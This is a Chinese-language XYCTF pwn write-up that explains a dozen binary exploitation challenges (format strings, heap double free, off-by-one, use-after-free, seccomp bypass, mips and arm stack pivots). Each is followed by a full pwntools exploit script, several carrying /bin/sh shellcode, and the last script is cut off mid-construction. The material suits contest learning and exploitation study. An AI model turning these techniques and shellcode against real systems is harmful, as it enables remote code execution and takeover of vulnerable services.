# PWN

## BabyGift

![image-20240422202855033](https://awaqwqa.github.io/img/xyctf/image-20240422202855033.png)

- 利用这里会让字符串地址赋值给rdi 然后我们通过劫持程序流程跑到printf处 利用格式化字符串漏洞就能泄露libc地址 然后触发system函数

```python
from pwn import *

# context(os='linux', arch='amd64', log_level='debug')
# context(os='linux', arch='amd64')
# context.terminal = ['byobu', 'sp', '-h']


file_name = "./vuln"
url = "127.0.0.1"
port = 64472

elf = ELF(file_name)
# p= process(file_name)
# p = gdb.debug(file_name,"b *Menu+113")
p = remote(url,port)

sd = lambda s : p.send(s)
sl = lambda s : p.sendline(s)
sa = lambda n,s : p.sendafter(n,s)
sla = lambda n,s : p.sendlineafter(n,s)
rc = lambda n : p.recv(n)
rl = lambda  : p.recvline()
ru = lambda s : p.recvuntil(s)
ra = lambda : p.recvall()
ia = lambda : p.interactive()
uu32 = lambda data : u32(data.ljust(4, b'\x00'))
uu64 = lambda data : u64(data.ljust(8, b'\x00'))
pop_rbp = p64(0x4012D0)
lea_rax = p64(0x4012A0 )
bss = p64(0x404020+0x200)
sub_rsp = p64(0x4012DC)
ret = p64(0x40101a)
mov_rax_0_pop_rbp = p64(0x4012CB)
mov_rax_printf = p64(0x401202)


ru(b"Your name:\n")
sl(b"elegy")
ru(b"Your passwd:\n")
payload = b"%27$p%11$p".ljust(0x20,b"a")+p64(0x404020+0x100)+mov_rax_printf +p64(0x40122D)*2
sd(payload)
res = rl()
libc_base = int(res[:14],16) -128 -0x29DC0
stack_addr = int(res[14:28],16)
print("stack_addr",hex(stack_addr))
system_addr = 0x50D70 +libc_base
print(hex(libc_base))
ru(b"Your name:\n")
sl(b"elegy")
ru(b"Your passwd:\n")
payload = b"/bin/sh\x00".ljust(0x28,b"a") +ret+p64(system_addr)
sl(payload)
ia()
```

## fastfastfast

- 简单的堆题 free的时候没有做任何检测 直接`double free` 然后通过指向bss表中 泄露出标准io地址从而推算出libc地址

  ![image-20240422211524070](https://awaqwqa.github.io/img/xyctf/image-20240422211524070.png)

- `double free`后任意地址malloc

  - ![image-20240422211447696](https://awaqwqa.github.io/img/xyctf/image-20240422211447696.png)

- bss段标准输入输出流io地址信息

  - ![image-20240422211628353](https://awaqwqa.github.io/img/xyctf/image-20240422211628353.png)

- 通过在gdb中输入libc获取libc基础地址来算和io之间的地址偏差 

  - ![image-20240422211647867](https://awaqwqa.github.io/img/xyctf/image-20240422211647867.png)


算一下偏差就可以了 

然后通过第二次`double free` 修改malloc hook 为onegadget即可

### 脚本

```python
from pwn import *
# context(os='linux', arch='mips',endian="little", log_level='debug')
context(os='linux', arch='amd64', log_level='debug')
# context(os='linux', arch='amd64')
context.terminal = ['byobu', 'sp', '-h']


file_name = "./vuln"
url = ""
port = 1111

elf = ELF(file_name)
# p= process(file_name)
p = gdb.debug(file_name,"b *main+42")
# p = remote(url,port)

sd = lambda s : p.send(s)
sl = lambda s : p.sendline(s)
sa = lambda n,s : p.sendafter(n,s)
sla = lambda n,s : p.sendlineafter(n,s)
rc = lambda n : p.recv(n)
rl = lambda  : p.recvline()
ru = lambda s : p.recvuntil(s)
ra = lambda : p.recvall()
ia = lambda : p.interactive()
uu32 = lambda data : u32(data.ljust(4, b'\x00'))
uu64 = lambda data : u64(data.ljust(8, b'\x00'))
def Menu(index):
    ru(b">>> ")
    sl(index)
def create(index,content):
    Menu(b"1")
    ru(b"please input note idx\n")
    sl(str(index).encode())
    ru(b"please input content\n")
    sd(content)
    print(f"创建了一个index:{index}的chunk")
def delete(index):
    Menu(b"2")
    ru(b"please input note idx\n")
    sl(str(index).encode())
    print(f"删除一个index:{index}的chunk")
def show(index):
    Menu(b"3")
    ru(b"please input note idx\n")
    sl(str(index).encode())
    return rc(0x68)
#构造double free
for i in range(9):
    create(i,chr(0x61+i).encode()*0x68)
for i in range(9):
    delete(i)
delete(7)
for i in range(7):
    create(i,chr(0x61+i).encode())
got_addr = 0x401050
bss_addr = 0x404070 
# 控制fd 指向我们想要malloc的地址
create(7,p64(bss_addr))
create(8,b"aaaaaaaa")
create(9,b"a")
# 控制bss_addr段
create(10,p64(bss_addr))
print("开始泄露")
res = show(10)
# print("res",u64(res[16:24]))
#算出libc
libc_base = u64(res[16:24]) - 2021024
system_addr = libc_base + 0xe3b31
malloc_hook = libc_base + (0x7f291e7a2b70-0x7f291e5b6000 )
print("libc_base:",hex(libc_base))
print("malloc_hook:",hex(malloc_hook))
print("system_addr:",hex(system_addr))
print("成功泄露")
#第二次double free
for i in range(9):
    create(i,b"aaaaaaaa"*2)
for i in range(9):
    delete(i)
print("两个fastbin情况")
# input("e")
delete(7) 
print("构造double free")
for i in range(7):
    create(i,b"aaaaaaaa"*2)
print("tcache删除完毕")
# 修改malloc_hook
create(8,p64(malloc_hook ))
create(9,p64(0x0))
print("malloc_hook:",hex(malloc_hook))
print("system_addr:",hex(system_addr))
create(10,p64(system_addr))
create(11,p64(system_addr))
create(12,b"a")
ia()
```

## fmt

> scanf和fmt类似 有格式化 我们可以通过%n$p来实现指定第几个参数地址写入内容 然后前六个参数都是寄存器 后面的参数就是栈地址了 按照栈顶依次选择

- 这题我们拥有两次写入机会 我们可以第一次写入目标地址 然后第二次通过scanf来向目标地址写入数据 
- 我们选择打exit_hook 写入one_gadget 就可以成功劫持了

### exit hook地址写入栈:

![image-20240422212450209](https://awaqwqa.github.io/img/xyctf/image-20240422212450209.png)

### 选择

```c
%7$ld
```

### 脚本

```python
from pwn import *

context(os='linux', arch='amd64', log_level='debug')
# context(os='linux', arch='amd64')
context.terminal = ['byobu', 'sp', '-h']


# file_name = "./vuln"
url = "127.0.0.1"
port = 53235


# elf = ELF(file_name)
# p= process(file_name)
# p = gdb.debug(file_name,"b main")
p = remote(url,port)

sd = lambda s : p.send(s)
sl = lambda s : p.sendline(s)
sa = lambda n,s : p.sendafter(n,s)
sla = lambda n,s : p.sendlineafter(n,s)
rc = lambda n : p.recv(n)
rl = lambda  : p.recvline()
ru = lambda s : p.recvuntil(s)
ra = lambda : p.recvall()
ia = lambda : p.interactive()
uu32 = lambda data : u32(data.ljust(4, b'\x00'))
uu64 = lambda data : u64(data.ljust(8, b'\x00'))

res = ru(b"\n")
printf_addr = int(res[-15:-1],16)
print("printf_addr:",hex(printf_addr))

libc_base = printf_addr - 0x61CC0
print("libc_base:",hex(libc_base))
exit_hook_addr = libc_base +2240352+8
exit_hook_args_addr = libc_base +2238824
system_addr = libc_base +0x522C0
one_gadget = libc_base +0xe3b2e
print("exit_hook:",hex(exit_hook_addr))
print("exit_hook args",hex(exit_hook_args_addr))
print("system_addr:",hex(system_addr))
print("one_gadget:",hex(one_gadget))
# cannary-8位置
cannary = libc_base +2045376+0x28 -0x8
print("cannary:",hex(cannary))
# %7$d 就是rsp+8
# 第一次构造
# payload = b"%64s%13$s".ljust(0x8,b"a")+p64(cannary)*3
payload =b"%7$ld".ljust(8,b"\x00")+p64(exit_hook_addr)
# payload =b"%13$s"
sd(payload)
payload=str(one_gadget).encode()
input(":")
# payload = b"d"*0x38+p64(cannary)+b"c".ljust(32,b"c")
sl(payload)
ia()
```

## GuestBook

> 存在栈的off_by_one漏洞 我们通过提前在栈里面写满backdoor地址 然后通过修改返回地址最后一个字节 来实现栈迁移返回到存放backdoor的栈地址上 只要写满了 概率还挺大 然后就可以在第二次返回的时候触发backdoor函数

![image-20240422213216922](https://awaqwqa.github.io/img/xyctf/image-20240422213216922.png)

```python
import time

from pwn import *

context(os='linux', arch='amd64', log_level='debug')
# context(os='linux', arch='amd64')
context.terminal = ['byobu', 'sp', '-h']


file_name = "./vuln"
url = "xyctf.top"
port = 34019

# elf = ELF(file_name)
# p= process(file_name)
# p = gdb.debug(file_name,"b *0x401321")
p = remote(url,port)

sd = lambda s : p.send(s)
sl = lambda s : p.sendline(s)
sa = lambda n,s : p.sendafter(n,s)
sla = lambda n,s : p.sendlineafter(n,s)
rc = lambda n : p.recv(n)
rl = lambda  : p.recvline()
ru = lambda s : p.recvuntil(s)
ra = lambda : p.recvall()
ia = lambda : p.interactive()
uu32 = lambda data : u32(data.ljust(4, b'\x00'))
uu64 = lambda data : u64(data.ljust(8, b'\x00'))
def add(index,name,id):
    ru(b"index\n")
    sl(str(index).encode())
    ru(b"name:\n")
    sd(name)
    ru(b"id:\n")
    sl(id)
backdoor = 0x40133A
for i in range(0,31):
    add(i,p64(backdoor)*2,b"0")
add(32,b"\x3a\x13\x40",b"48")
ru(b"index\n")
sl(b"-1")
ru(b"Have a good time!\n")
time.sleep(2)
sd(b"ls")
# print(rl())
ia()
```

## hello_world

> 两次栈溢出 第一次泄露libc 第二次直接劫持程序流程one_gadget

```python
from pwn import *

context(os='linux', arch='amd64', log_level='debug')
# context(os='linux', arch='amd64')
context.terminal = ['byobu', 'sp', '-h']


file_name = "./vuln"
url = "xyctf.top"
port = 35494

elf = ELF(file_name)
# p= process(file_name)
# p = gdb.debug(file_name,"b main")
p = remote(url,port)

sd = lambda s : p.send(s)
sl = lambda s : p.sendline(s)
sa = lambda n,s : p.sendafter(n,s)
sla = lambda n,s : p.sendlineafter(n,s)
rc = lambda n : p.recv(n)
rl = lambda  : p.recvline()
ru = lambda s : p.recvuntil(s)
ra = lambda : p.recvall()
ia = lambda : p.interactive()
uu32 = lambda data : u32(data.ljust(4, b'\x00'))
uu64 = lambda data : u64(data.ljust(8, b'\x00'))

ru(b"please input your name: ")
sd(b"a"*0x28+b"\x91")
result = rl()[-7:-1]
baselibc = u64(result.ljust(8,b"\x00")) +47 -0x29DC0
print(result)
print(hex(baselibc))
ru(b"please input your name: ")
rb= p64(0x2072+0x78+baselibc)
sd(b"a"*0x20+p64(0)+p64(0x50a47+baselibc))
ia()

```

## Intermittent

> 一次性4字节shellcode空间 

- 本来想的是每次用两字节操作两字节跳转到下一个可执行区域 发现不太现实

- 然后发现跳转到执行shellcode的地方的时候寄存器上已经几乎布置好了一些我们需要的值

  ![image-20240422214330654](https://awaqwqa.github.io/img/xyctf/image-20240422214330654.png)

  ![image-20240422214400338](https://awaqwqa.github.io/img/xyctf/image-20240422214400338.png)

- 我们可以利用rep movsb指令 这个指令可以让rsi寄存器的地址开始rcx的字节数据赋值给rdi地址所指的区域 我们可以发现rdx已经有了我们执行shellcode的地址 然后rsi就是我们输入的字符串地址 我们只需要让rdx寄存器的值给rdi 然后触发rep movsb即可 就可以实现shellcode的写入
- rep movsb是两字节 我们用栈传递参数让rdx赋值给rdi 两字节 刚好四字节 那么我们字符串后面填上getshell的shellcode即可

```python
from pwn import *

context(os='linux', arch='amd64', log_level='debug')
# context(os='linux', arch='amd64')
context.terminal = ['byobu', 'sp', '-h']


file_name = "./vuln"
url = ""
port = 1111

elf = ELF(file_name)
# p= process(file_name)
p = gdb.debug(file_name,"b *main+273")
# p = remote(url,port)

sd = lambda s : p.send(s)
sl = lambda s : p.sendline(s)
sa = lambda n,s : p.sendafter(n,s)
sla = lambda n,s : p.sendlineafter(n,s)
rc = lambda n : p.recv(n)
rl = lambda  : p.recvline()
ru = lambda s : p.recvuntil(s)
ra = lambda : p.recvall()
ia = lambda : p.interactive()
uu32 = lambda data : u32(data.ljust(4, b'\x00'))
uu64 = lambda data : u64(data.ljust(8, b'\x00'))

ru(b"show your magic: ")
shellcode1 = b'\x52\x5F\xF3\xA4'
# nop指令不重要
shellcode2 = b'\x90'*4
shellcode3 = b'\x90'*4
shellcode = shellcode1 +b"\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05"
sd(shellcode.ljust(0x100,b"\x90"))
ia()
```

## inviisible_flag

> 禁止了orw的orw 我们直接使用平替函数 <br>[新建标签页 (mebeim.net)](https://syscalls.mebeim.net/?table=x86/64/x64/v6.5)推荐这个网站进行查看有哪些函数和传参规范

- 先开始想复杂了 想成了利用retfq来转化为32位绕过open等函数的禁止 参考强网杯的shellcode[第五届强网杯 Pwn - shellcode - Bugku CTF](https://ctf.bugku.com/writeup/detail/id/429.html)还是学到了东西 甚至去想办法触发新的mmap函数来获取一个低地址的可执行区域 然后把shellcode copy过去执行 因为refq不支持跳转超过四字节的地址 结果发现想复杂了 这里保留了原本的构思代码
- tips:`sendfile64`(调用号:0x28)可以直接让一个文件描述符的内容输出到另一个文件描述符上非常适合平替这次的write函数

```python
from pwn import *
context(log_level='debug')
context(os='linux')
context.terminal = ['byobu', 'sp', '-h']

# shellcode_copy = asm(
# '''
# copy_loop:
# cmp rcx, 0
# je end_copy                
# mov al, [rsi]              
# mov [rdi], al               
# inc rsi                    
# inc rdi                    
# dec rcx                     
# jmp copy_loop
# end_copy:       
# '''
# ,arch="amd64")
file_name = "./vuln"
url = "xyctf.top"
port =35002

elf = ELF(file_name)
# p= process(file_name)
# p = gdb.debug(file_name,"b *main+181")
# b 0x114514061 
# p = gdb.debug(file_name,"b *0x114514061")
p = remote(url,port)

sd = lambda s : p.send(s)
sl = lambda s : p.sendline(s)
sa = lambda n,s : p.sendafter(n,s)
sla = lambda n,s : p.sendlineafter(n,s)
rc = lambda n : p.recv(n)
rl = lambda  : p.recvline()
ru = lambda s : p.recvuntil(s)
ra = lambda : p.recvall()
ia = lambda : p.interactive()
uu32 = lambda data : u32(data.ljust(4, b'\x00'))
uu64 = lambda data : u64(data.ljust(8, b'\x00'))
# ru(b"show your magic again\n")
# # retfq 等效为
# # pop IP
# # pop CS

# # retfq无法跳转4字节以上的地址

# # 尝试fork一个新进程
# # puts函数
# # 0x114514000
# # \x00 \x40 \x51 \x13  cs:\x01

# # eip rip cs:ip
# # retfq ->cs位0x23 ip

# # mov rax,[rbp+24]
# # add rax,80
# # jmp rax
# # 0x11451404d ->0x14514000 57次
# # 

# # b *0x114514061 

# shellcode = asm('''
# mov r9d,0x0
# mov r8d,0xffffffff
# mov ecx,0x22
# mov edx,0x7
# mov esi,0x1000
# movabs rax,0x14514000
# mov rdi,rax 
# mov rax,[rbp+24]
# sub rax,647
# call rax
# ''',arch="amd64")
# # 将内容赋值过去

# shellcode += asm(
# '''
# mov rsi,0x11451406a; 
# mov rdi,0x14514000;
# mov rcx,456     

# copy_loop:
#   cmp rcx, 0
#   je end_copy                 ; 
#   mov al, [rsi]               ; 
#   mov [rdi], al               ; 
#   inc rsi                     ; 
#   inc rdi                     ; 
#   dec rcx                     ; 
#   jmp copy_loop               ; 

# end_copy:
#     mov rax,0x14514000
#     jmp rax
# '''
# ,arch="amd64")
# # 转化为32位
# shellcode +=asm(
# '''
# push 0x23
# push 0x14514009
# retfq
# '''
# ,arch="amd64")
# # 构造栈
# shellcode += asm(
# '''
# mov esp,0x14514400
# mov ebp,0x14514420
# '''
# ,arch="i386")
# # 调用open函数
# shellcode += asm(
# '''
# xor eax, eax ; 
# mov eax,0x5 ;
# push 0x00006761;
# push 0x6c662f2e;
# mov ebx,esp;
# mov edi,esp; 
# mov ecx, 0;  
# int 0x80; 
# ''',arch="i386")
# # read
# shellcode += asm(
# '''
# mov ebx,3;
# mov ecx,esp;
# mov edx,0x20;
# mov eax,0x3;
# int 0x80;
# '''
# ,arch="i386")
# # write
# shellcode +=asm(
# '''
# mov ebx,1;
# mov ecx,esp;
# mov edx,0x20;
# mov eax,0x4;
# int 0x80;
# '''
# ,arch="i386")


# payload = shellcode

# payload = payload.ljust(0x160,b'\x00')
# payload += b"\x00\x00./flag\x00\x00\x00"
# print(payload)
# sd(payload)
# ru(b"show your magic again\n")
# shellcode= asm(
# '''
# push 0x23    
# '''
# )
# ia()
# print(len(asm(shellcode,arch='amd64')

ru(b"show your magic again\n")
# read函数 and sendfile函数
shellcode = asm(
'''
mov rax, 0x67616c662f2e
push rax
xor rdi, rdi
sub rdi, 100
mov rsi, rsp
xor edx, edx
xor r10, r10
push 0x101
pop rax
syscall

mov rdi, 1
mov rsi, 3
push 0
mov rdx, rsp
mov r10, 0x100
push 0x28
pop rax
syscall

mov rax,1

'''
,arch="amd64")
sd(shellcode)
ru(b"}")
ia()
```

## malloc_flag

> 不懂为什么这题就只有30多解 

- 读取了flag而且写入了chunk中再把chunk free了 这个free chunk就进入了tcache 我们直接malloc一个大小一样的chunk 然后输出 就可以获取flag

```python
from pwn import *
# context(os='linux', arch='mips',endian="little", log_level='debug')
context(os='linux', arch='amd64', log_level='debug')
# context(os='linux', arch='amd64')
context.terminal = ['byobu', 'sp', '-h']


file_name = "./vuln"
url = ""
port = 52689

# elf = ELF(file_name)
# p= process(file_name)
# p = gdb.debug(file_name,"b *main+516")
p = remote(url,port)

sd = lambda s : p.send(s)
sl = lambda s : p.sendline(s)
sa = lambda n,s : p.sendafter(n,s)
sla = lambda n,s : p.sendlineafter(n,s)
rc = lambda n : p.recv(n)
rl = lambda  : p.recvline()
ru = lambda s : p.recvuntil(s)
ra = lambda : p.recvall()
ia = lambda : p.interactive()
uu32 = lambda data : u32(data.ljust(4, b'\x00'))
uu64 = lambda data : u64(data.ljust(8, b'\x00'))
def recv_menu():
    ru(bytearray([0xE8, 0xAF, 0xB7, 0xE8, 0xBE, 0x93, 0xE5, 0x85, 0xA5, 0xE9, 0x80, 0x89, 0xE9, 0xA1, 0xB9, 0x3A, 0x20]))
def add(name,size):
    recv_menu()
    sl(b"1")
    # 请输入名字:
    ru(bytearray([0xE8, 0xAF, 0xB7, 0xE8, 0xBE, 0x93, 0xE5, 0x85, 0xA5, 0xE5, 0x90, 0x8D, 0xE5, 0xAD, 0x97, 0x3A, 0x20]))
    sl(str(name).encode())
    # 请输入大小 (十进制或十六进制):
    ru(bytearray([0xE8, 0xAF, 0xB7, 0xE8, 0xBE, 0x93, 0xE5, 0x85, 0xA5, 0xE5, 0xA4, 0xA7, 0xE5, 0xB0, 0x8F, 0x20, 0x28, 0xE5, 0x8D, 0x81, 0xE8, 0xBF, 0x9B, 0xE5, 0x88, 0xB6, 0xE6, 0x88, 0x96, 0xE5, 0x8D, 0x81, 0xE5, 0x85, 0xAD, 0xE8, 0xBF, 0x9B, 0xE5, 0x88, 0xB6, 0x29, 0x3A]))
    sl(str(size).encode())
def delete(name):
    recv_menu()
    sl(b"2")
    ru(bytearray([0xE8, 0xAF, 0xB7, 0xE8, 0xBE, 0x93, 0xE5, 0x85, 0xA5, 0xE8, 0xA6, 0x81, 0xE9, 0x87, 0x8A, 0xE6, 0x94, 0xBE, 0xE7, 0x9A, 0x84, 0xE5, 0x90, 0x8D, 0xE5, 0xAD, 0x97, 0x3A, 0x20]))
    sl(str(name).encode())
def displayChunks():
    recv_menu()
    sl(b"3")
    return rl()
def displayChunk(name):
    recv_menu()
    sl(b"4")
    # 请输入要查看内容的内存块名字:
    ru(bytearray([0xE8, 0xAF, 0xB7, 0xE8, 0xBE, 0x93, 0xE5, 0x85, 0xA5, 0xE8, 0xA6, 0x81, 0xE6, 0x9F, 0xA5, 0xE7, 0x9C, 0x8B, 0xE5, 0x86, 0x85, 0xE5, 0xAE, 0xB9, 0xE7, 0x9A, 0x84, 0xE5, 0x86, 0x85, 0xE5, 0xAD, 0x98, 0xE5, 0x9D, 0x97, 0xE5, 0x90, 0x8D, 0xE5, 0xAD, 0x97, 0x3A, 0x20]))
    sl(str(name).encode())
    return rl()
add(1,0x100)
res = displayChunk(1)
print(res)
ia()
```

## EZ1.0?(mips)

> 白给 一个栈迁移 然后到bss端执行shellcode 

- 本地bss没有可执行权限但是远程有 这题应该麻烦的是搭建mips环境

```python
import time

from pwn import *

context(os='linux', arch='mips',endian="little", log_level='debug')
context.terminal = ['byobu', 'sp', '-h']
# p = process(["qemu-mipsel", "-g", "12345", "-L", "/usr/mipsel-linux-gnu/", "./mips"])
# pwnlib.qemu.user_path(arch='mips')
# pwnlib.qemu.ld_prefix(arch='mips')
file_name = "./mips"
url = "127.0.0.1"
port = 50176
stack_addr =  0x7ffff000
# elf = ELF(file_name)
# p= process(file_name)
p = remote(url,port)
payload=b"b"*0x40+p32(0x493400)+p32(0x400864)
p.sendafter(b"welcome XYCTF mips world",payload)

pause()

payload=b"a"*0x44+p32(0x493460)+b"\x11\x01\x06\x24\xff\xff\xd0\x04\x00\x00\x06\x24\xe0\xff\xbd\x27\x14\x00\xe4\x27\x00\x00\x05\x24\xab\x0f\x02\x24\x0c\x00\x00\x00/bin/sh"
p.send(payload)
p.interactive()

```

## EZ2.0?(arm)

> 和mips一模一样 栈迁移 然后shellcode

```python
from pwn import *
# context(os='linux', arch='mips',endian="little", log_level='debug')
context( arch='arm', log_level='debug')
# context(os='linux', arch='amd64')
context.terminal = ['byobu', 'sp', '-h']


file_name = "./arm"
url = "127.0.0.1"
port = 57621
elf = ELF(file_name)
# p= process(file_name)
# p = gdb.debug(file_name,"b vuln")
p = remote(url,port)

sd = lambda s : p.send(s)
sl = lambda s : p.sendline(s)
sa = lambda n,s : p.sendafter(n,s)
sla = lambda n,s : p.sendlineafter(n,s)
rc = lambda n : p.recv(n)
rl = lambda  : p.recvline()
ru = lambda s : p.recvuntil(s)
ra = lambda : p.recvall()
ia = lambda : p.interactive()
uu32 = lambda data : u32(data.ljust(4, b'\x00'))
uu64 = lambda data : u64(data.ljust(8, b'\x00'))
bss = elf.bss()
print("bss:",hex(bss))
ru(b"welcome XYCTF arm world\n")
sd(b"a"*0x40+p32(bss+0x100+0x44)+p32(0x10588))
shellcode  = b"\x02\x20\x42\xe0\x1c\x30\x8f\xe2"
shellcode += b"\x04\x30\x8d\xe5\x08\x20\x8d\xe5"
shellcode += b"\x13\x02\xa0\xe1\x07\x20\xc3\xe5"
shellcode += b"\x04\x30\x8f\xe2\x04\x10\x8d\xe2"
shellcode += b"\x01\x20\xc3\xe5\x0b\x0b\x90\xef"
shellcode += b"/bin/sh"
print("shellcode:",shellcode)
# input("test")
input("test")
payload = b"a"*0x40+p32(bss+0x100+0x44)+p32( 0x8afc4 )+shellcode
sd(payload)
ia()
```

## one_byte

> 写入chunk的时候多写了一位0 造成one_byte漏洞

- 通过chunk进入unsortedbin中然后输出`fd`和`bk`泄露libc地址

- 通过chunk进入tcache然后 malloc回来 然后输出chunk内容 泄露`heap`地址

### 劫持freechunk

- 因为这题用的两个全局变量来存储的使用情况和chunk地址 我们不太方便伪造`fake head`来实现劫持
- 因为存在off_by_one漏洞 我们可以利用合并机制 进行修改一些已经进入bin链的chunk 修改其fd 然后我们再通过malloc 就可以实现malloc下来一个任意地址 这里我们选择打malloc hook
- 大致就是构造一个情况:a b c 三个chunk 然后ac都为`unsortedbin chunk` b为`fastbin chunk`然后让ac触发合并机制 把b包含在合并后的大chunk中 我们再将这个大chunk malloc下来 这样我们就可以修改b chunk了 

```python
import time

from pwn import *
# context(os='linux', arch='mips',endian="little", log_level='debug')
# context(os='linux', arch='amd64', log_level='debug')
context(os='linux', arch='amd64')
context.terminal = ['byobu', 'sp', '-h']
file_name = "./vuln"
url = "127.0.0.1"
port = 65030
# elf = ELF(file_name)
# p= process(file_name)
# p = gdb.debug(file_name,"b *main+34")
p = remote(url,port)

sd = lambda s : p.send(s)
sl = lambda s : p.sendline(s)
sa = lambda n,s : p.sendafter(n,s)
sla = lambda n,s : p.sendlineafter(n,s)
rc = lambda n : p.recv(n)
rl = lambda  : p.recvline()
ru = lambda s : p.recvuntil(s)
ra = lambda : p.recvall()
ia = lambda : p.interactive()
uu32 = lambda data : u32(data.ljust(4, b'\x00'))
uu64 = lambda data : u64(data.ljust(8, b'\x00'))
def recv_menu():
    ru(b">>> ")
def debug():
    gdb.attach(p,"b *main+34")
    input("stop")
def add(index,size):
    recv_menu()
    sl(b"1")
    ru(b"[?] please input chunk_idx: ")
    sl(str(index).encode())
    ru(b"[?] Enter chunk size: ")
    sl(str(size).encode())
    print("---------------\nadd chunk {}\n---------------".format(index))
def delete(index):
    recv_menu()
    sl(b"2")
    ru(b"[?] please input chunk_idx: ")
    sl(str(index).encode())
    print("---------------\ndelete chunk {}\n---------------".format(index))
def edit(index,content):
    recv_menu()
    sl(b"4")
    ru(b"[?] please input chunk_idx: ")
    sl(str(index).encode())
    time.sleep(0.1)
    sd(content)
def view(index,n):
    recv_menu()
    sl(b"3")
    ru(b"[?] please input chunk_idx: ")
    sl(str(index).encode())
    return rc(n)
for i in range(11):
    add(i,0x100)
for i in range(10):
    delete(i)
# 0-7是占用状态
for i in range(7):
    add(i,0x100)
add(7,0x100)
res = view(7,0x10)
base_libc = u64(res[:8])-2019072
print("base_libc:",hex(base_libc))
res = view(3,0x10)
base_heap = u64(res[:8]) - 1216
print("base_heap:",hex(base_heap))
# 开始构造一个chunk处于fastbin中情况
for i in range(8):
    delete(i)
delete(10)
delete(11)

print("占用的已经删除")
# 要实现tcache满 然后fastbin中存在
for i in range(7):
    add(i,0x78)
for i in range(7,14):
    add(i,0x120)
# prev_size size fd bk
chunk_addr = base_heap
fakechunk = b"a"*16+p64(0)+p64(721)+p64(base_heap+5696)+p64(base_heap+5696)+p64(base_heap+5664)*5
add(14,0x20)
# 合并chunk
add(15,0x120)
edit(15,fakechunk)
add(16,0x78)
# 用于覆写
add(17,0x138)
# 用于合并
add(18,0x120)
add(19,0x20)
for i in range(14):
    delete(i)
delete(15)
delete(16)
# delete(1)
delete(19)
edit(17,b"a"*0x130+p64(720)+b"\x30")
print("base_heap:",hex(base_heap))
print("base_libc:",hex(base_libc))

delete(18)
print("base_heap:",hex(base_heap))
print("base_libc:",hex(base_libc))
add(20,0x170)
# 构造到malloc hook
edit(20,b"a"*0x100+p64(0x130)+p64(0x80)+p64(base_libc+0x1ecb70-0x10))
print("base_heap:",hex(base_heap))
print("base_libc:",hex(base_libc))
for i in range(21,30):
    add(i,0x78)
edit(29,p64(0xe3b01+base_libc))
add(30,0x20)
ia()

```

## ptmalloc2_its_myheap

> 这题利用的一个`head chunk`进行记录信息 然后一个`content chunk`记录内容 而且没有对`content chunk`的size进行限制
>
> 并且最重要的是在free的时候没有对chunk指针进行清空 这样我们可以实现uaf
>
> 输出chunk内容的时候也是根据我们输入的size来进行输出的 所以可以泄露大量信息
>
> 有一个gift函数 输出了libc地址 我们可以直接劫持gift函数和hello_world字符串来实现getshell

### 劫持head chunk

> 由于信息都是通过`head chunk`进行的记录 所以我们直接劫持`head chunk`就可以实现任意free了 因为在free `head chunk`的时候会同步free `head chunk`记录的buf指针 我们劫持`head chunk`就可以任意修改buf指针完成任意free 这样我们可以轻松构造一个double free 实现任意写操作

- 触发fastbin的合并
  - 我们可以让`head chunk`进入fastbin链中 然后通过申请一个largebin chunk触发合并机制 然后让这些chunk合并进入unsortedbin 我们再申请为 `content chunk`这样我们可以对这些原本的head chunk进行劫持

- 构造double free
  - 任意free 让fastbin链中第二个chunk free来触发double free 劫持bss段数据

### 脚本

```python
from pwn import *

context(os='linux', arch='amd64', log_level='debug')
# context(os='linux', arch='amd64')
# context.terminal = ['byobu', 'sp', '-h']


# file_name = "./vuln"
url = "127.0.0.1"
port = 64814

# elf = ELF(file_name)
# p= process(file_name)
# p = gdb.debug(file_name,"b *main+34")
p = remote(url,port)

sd = lambda s : p.send(s)
sl = lambda s : p.sendline(s)
sa = lambda n,s : p.sendafter(n,s)
sla = lambda n,s : p.sendlineafter(n,s)
rc = lambda n : p.recv(n)
rl = lambda  : p.recvline()
ru = lambda s : p.recvuntil(s)
ra = lambda : p.recvall()
ia = lambda : p.interactive()
uu32 = lambda data : u32(data.ljust(4, b'\x00'))
uu64 = lambda data : u64(data.ljust(8, b'\x00'))

def add(index,size,content):
    ru(b">>> ")
    sl(b"1")
    ru(b"[?] please input chunk_idx: ")
    sl(str(index).encode())
    ru(b"[?] Enter chunk size: ")
    sl(str(size).encode())
    ru(b"[?] Enter chunk data: ")
    sd(content)
    print(f"----------\n添加index为:{index}的chunk\n----------")
def delete(index):
    ru(b">>> ")
    sl(b"2")
    ru(b"[?] Enter chunk id: ")
    sl(str(index).encode())
    print(f"----------\n删除index为{index}的chunk\n----------")
def view(index):
    ru(b">>> ")
    sl(b"3")
    ru(b"[?] Enter chunk id: ")
    sl(str(index).encode())
    res = rc(0x100)
    return res
def gift():
    ru(b">>> ")
    sl(b"114514")
    return (ru(b"\n"))
def getData(bytes):
    data = []
    for i in  range(int(len(bytes)/8)):
        try:
            data.append(u64(bytes[i*8:(i+1)*8]))
        except:
            print("非预期数据")
    return data


# fastbin 的合并机制需要 在申请large chunk时

# 创建unsortedbin大小占满 并且多两个chunk
for i in range(6):
    # 0x110大小chunk 8号就是我们要修改的chunk
    add(i,0x18,b"a")
for i in range(6):
    delete(i)


# 此时index为6的获取了 各个链的chunk
add(6,0x500,b"a")
print("获取一个大chunk装了heap")
res = view(6)
addr_slice = getData(res)
# 0xae4400 - 0xae4000   0x1baf400
base_heap = addr_slice[14] - 0x400
print("base_heap:",hex(base_heap))
# x/10a &chunk_list 前6号占满 但是前五个isused为0

# 开始构造double free 先是取回所有的tcache 再占满tcache
for i in range(5):
    add(i,0x18,b"a")
for i in range(5):
    delete(i)
# 此时fastbin有三个 tcache占满 我们malloc一个巨无霸然后就可以覆写fastbin fastbin情况:0xacf8e0 —▸ 0xacf8c0 —▸ 0xacf8a0 ◂— 0x0
print("占满tcache")
# chunk_list[4] 对应 这里paload偏移32位置
# 此时chunk_list使用情况: 6 7 处于使用状态
# 如果free则是free chunk_list[4] 所以我们要构造好这个chunk 让它绕过安全检测 所以我们构造size和prev_inuse位 然后再构造里面的fd让它指向fastbin chunk中第二个chunk
fakechunk = {}
fakechunk["size"] = 0x31
fakechunk["prev_size"] = 0
# 这里随意
fakechunk["chunk_list_size"] = 0x20
fakechunk["isUsed"] = 1
# 看下面的解释
fakechunk["buff"] = base_heap+0xd10
# 要free的是:0x1279d00 链子:0x1279d20 —▸ 0x1279d00 变成:0x1279d00 —▸ 0x1279d20 ◂— 0x1279d00
